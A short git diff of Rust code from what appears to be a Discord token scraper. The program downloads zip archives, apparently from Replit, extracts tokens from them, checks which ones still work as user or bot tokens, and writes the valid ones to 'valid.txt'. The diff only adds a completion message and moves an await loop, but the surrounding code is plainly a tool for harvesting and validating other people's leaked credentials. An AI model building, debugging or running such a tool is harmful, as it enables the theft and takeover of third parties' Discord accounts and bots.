@@ -54,6 +54,7 @@ https://discord.gg/qCJwVERPRV\x1b[0m");
             None => (),
         }
     }
+    println!("\x1b[0;32mFinished all downloads!\x1b[0m");
     let mut tokens: Vec<String> = Vec::new();
     for zip in zips {
         let mut token = repl.search_extract(zip).await;
@@ -70,6 +71,7 @@ https://discord.gg/qCJwVERPRV\x1b[0m");
     for token in tokens.clone() {
         futs.push(repl.self_check_tokens(client.clone(), token.clone()));
     }
+    while let Some(_) = futs.next().await {}
 
     // Check Bot tokens
     let mut file_writer = OpenOptions::new()
@@ -78,7 +80,6 @@ https://discord.gg/qCJwVERPRV\x1b[0m");
         .open("valid.txt")
         .await.unwrap();
     file_writer.write_all(format!("Bot:\n").as_bytes()).await.unwrap();
-    while let Some(_) = futs.next().await {}
     let mut futs = FuturesUnordered::new();
     for token in tokens {
         futs.push(repl.bot_check_tokens(client.clone(), token.clone()));
